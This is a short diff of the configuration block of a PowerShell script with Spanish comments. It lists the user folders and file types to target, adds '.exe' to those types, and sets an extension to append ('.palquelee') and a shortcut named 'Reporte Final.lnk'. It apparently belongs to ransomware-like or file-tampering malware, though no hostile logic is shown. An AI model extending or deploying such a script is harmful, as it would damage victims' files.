@@ -3,7 +3,7 @@
 #####
 # VARIABLES PARA CONFIGURAR
 $dirs = "(Downloads|Desktop|Documents)"
-$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
+$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".exe", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
 $final_ext = ".palquelee"
 $archivo_lnk = "Reporte Final.lnk"
 #####
